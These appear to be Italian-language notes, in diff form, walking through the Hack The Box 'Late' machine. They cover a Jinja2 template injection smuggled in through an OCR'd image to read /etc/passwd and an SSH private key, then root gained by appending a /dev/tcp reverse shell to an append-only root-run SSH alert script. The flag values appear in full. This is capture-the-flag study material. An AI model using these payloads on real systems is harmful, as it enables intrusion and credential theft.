@@ -1,0 +1,287 @@
+10.10.11.156
+
+
+
+port 80     -> online images tool
+
+non trovo nulla solo support@late.htb magari devo mettere late.htb nel /etc/hosts?
+
+nella pagina c'è un link a http://images.late.htb/
+
+aggiungo in etc/hosts e mi collego
+
+vado su http://images.late.htb/
+
+posso caricare un'immagine e la trasfoirma in un documento ad esempio una immagine senza testo me l'ha traformata in <p></p> quindi un html/xml 
+fa anche delle operazioni quindi sul testo
+
+non posso caricare altri file che non siano immagini, tra l'altro non ho trovato la dir dove le salva quindi anche se potessi sarebbe inutile
+
+l'unico indizio che ho è:
+Convert image to text with Flask
+
+
+quindi è costruito con flask 
+
+https://medium.com/@amanzishan.az/building-a-flask-web-application-to-extract-text-from-images-3f761f4880d9         ---> sembra essere questa 
+
+se è fatta come quella di questo articolo allora è fatta usando pytesseract
+
+forse funziona qualcosa del genere 
+
+https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e
+
+solo che devo metter gli input in una immagine 
+
+{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+
+effettivamente potrebbe funzionare, ho qualche problema perchè ho errore :
+
+
+Error occured while processing the image: expected token 'end of print statement', got 'messages'
+
+
+ma mettendo determinati caratteri in effetti va in errore quindi il testo che metto nell'immagine viene interpretato
+
+https://stackoverflow.com/questions/52205558/jinja2-exceptions-templatesyntaxerror-expected-token-end-of-print-statement a quanto pare questo "linguaggio" è jinja 
+
+
+{{ get_flashed_messages.globals.builtins.open("/etc/passwd").read() }}
+
+
+
+Error occured while processing the image: 'function object' has no attribute 'globals'
+
+è cambiato l'errore
+
+non riesco a farlo funzionare ma potrebbe essere anche dovuto al font/dimensione
+forse non riesce a legegre bene il testo e lo interpreta male 
+
+
+{{ get_flashed_messages.__globals__.__builtins__.open(“/home/svc_acc/.ssh/id_rsa”).read() }}
+
+prendo id_rsa 
+
+
+┌──(kali㉿kali)-[~/…/SecNotes/htb/done/late]
+└─$ chmod 0600 id_rsa                                                                                          130 ⨯
+                                                                                                                     
+┌──(kali㉿kali)-[~/…/SecNotes/htb/done/late]
+└─$ ssh -i id_rsa svc_acc@10.10.11.156
+svc_acc@late:~$ 
+
+
+
+per sudo -l serve pwd
+
+svc_acc@late:~$ cat user.txt
+c8ae3f8d9154799dce3d6d9865d929a9
+
+
+
+
+svc_acc@late:~$ find / -writable -type  f 2>/dev/null | grep -v "/proc/" | grep -v cgroup | grep -v pip | grep -v python
+/home/svc_acc/.ssh/id_rsa
+/home/svc_acc/.ssh/id_rsa.pub
+/home/svc_acc/.ssh/authorized_keys
+/home/svc_acc/app/main.py
+/home/svc_acc/app/wsgi.py
+/home/svc_acc/.bashrc
+/home/svc_acc/linpeas.sh
+/home/svc_acc/.local/share/keyrings/login.keyring
+/home/svc_acc/.local/share/keyrings/user.keystore
+/home/svc_acc/.local/bin/pytesseract
+/home/svc_acc/.local/bin/flask
+/home/svc_acc/.gnupg/pubring.kbx
+/home/svc_acc/.gnupg/trustdb.gpg
+/home/svc_acc/.profile
+/home/svc_acc/.cache/motd.legal-displayed
+/home/svc_acc/.config/lxc/config.yml
+/sys/kernel/security/apparmor/.remove
+/sys/kernel/security/apparmor/.replace
+/sys/kernel/security/apparmor/.load
+/sys/kernel/security/apparmor/.access
+/usr/local/sbin/ssh-alert.sh
+/run/sendmail/mta/smsocket
+
+
+
+il file 
+
+/usr/local/sbin/ssh-alert.sh
+
+
+potrebbe essere interessante
+
+
+svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh
+#!/bin/bash
+
+RECIPIENT="root@late.htb"
+SUBJECT="Email from Server Login: SSH Alert"
+
+BODY="
+A SSH login was detected.
+
+        User:        $PAM_USER
+        User IP Host: $PAM_RHOST
+        Service:     $PAM_SERVICE
+        TTY:         $PAM_TTY
+        Date:        `date`
+        Server:      `uname -a`
+"
+
+if [ ${PAM_TYPE} = "open_session" ]; then
+        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
+fi
+
+
+
+
+il problema è che deve essere running come root non come svc_acc altrimenti non mi serve a null
+
+2022/06/03 20:09:01 CMD: UID=0    PID=26905  | chown svc_acc:svc_acc /usr/local/sbin/ssh-alert.sh 
+
+
+root cambia il chown del file ogni tot ??
+
+per triggerarlo e vederlo in pspy devo provare a entrare con ssh cosi dovrebbe avviarsi lo script
+
+
+2022/06/03 20:10:09 CMD: UID=0    PID=26928  | /bin/bash /usr/local/sbin/ssh-alert.sh 
+
+
+viene triggerato da root
+
+non riesco a scrivere nel file 
+
+
+però dalle acl dovrei riuscire a scrivere nel file:
+
+
+svc_acc@late:~$ getfacl /usr/local/sbin/ssh-alert.sh
+getfacl: Removing leading '/' from absolute path names
+# file: usr/local/sbin/ssh-alert.sh
+# owner: svc_acc
+# group: svc_acc
+user::rwx
+group::r-x
+other::r-x
+
+
+
+
+
+potrebbe essere un problema di attributes
+
+
+
+
+Not strictly related to the above question, still, I will put it here for future visitors, as I came here reading the title. From arch wiki:
+
+    File attributes
+
+    Apart from the file mode bits that control user and group read, write and execute permissions, several file systems support file attributes that enable further customization of allowable file operations. This section describes some of these attributes and how to work with them.
+
+    Warning: By default, file attributes are not preserved by cp, rsync, and other similar programs. chattr and lsattr
+
+    For ext2 and ext3 file systems, the e2fsprogs package contains the programs lsattr and chattr that list and change a file's attributes, respectively. Though some are not honored by all file systems, the available attributes are:
+
+    a: append only
+    c: compressed
+    d: no dump
+    e: extent format
+    i: immutable
+    j: data journalling
+    s: secure deletion
+    t: no tail-merging
+    u: undeletable
+    A: no atime updates
+    C: no copy on write
+    D: synchronous directory updates
+    S: synchronous updates
+    T: top of directory hierarchy
+
+    For example, if you want to set the immutable bit on some file, use the following command:
+
+    # chattr +i /path/to/file
+
+    To remove an attribute on a file just change + to -.
+
+For a file, with no additional attributes, the lsattr looks like this:
+
+$ lsattr /etc/hosts
+-------------e- /etc/hosts
+
+
+
+e infatti posso fare solo append e extent:
+
+
+
+
+svc_acc@late:~$ lsattr /usr/local/sbin/ssh-alert.sh
+-----a--------e--- /usr/local/sbin/ssh-alert.sh
+svc_acc@late:~$ 
+
+
+
+svc_acc@late:~$ echo "id > /tmp/id.txt" >> /usr/local/sbin/ssh-alert.sh
+funziona
+
+
+
+quindi ci posso aggiungere una reverse shell
+
+
+
+svc_acc@late:~$ cat /tmp/id.txt 
+uid=0(root) gid=0(root) groups=0(root)
+svc_acc@late:~$ 
+
+
+
+ok è corretto devo prendere solo la reverse shell
+
+
+
+
+svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh
+#!/bin/bash
+
+RECIPIENT="root@late.htb"
+SUBJECT="Email from Server Login: SSH Alert"
+
+BODY="
+A SSH login was detected.
+
+        User:        $PAM_USER
+        User IP Host: $PAM_RHOST
+        Service:     $PAM_SERVICE
+        TTY:         $PAM_TTY
+        Date:        `date`
+        Server:      `uname -a`
+"
+
+if [ ${PAM_TYPE} = "open_session" ]; then
+        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
+fi
+
+
+sh -i >& /dev/tcp/10.10.14.5/8081 0>&1
+
+
+
+
+
+
+faccio accesso con ssh e prendo la reverse shell
+
+
+
+# cat root.txt
+3f615a7a36046e8c47aa20c8455389cf
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
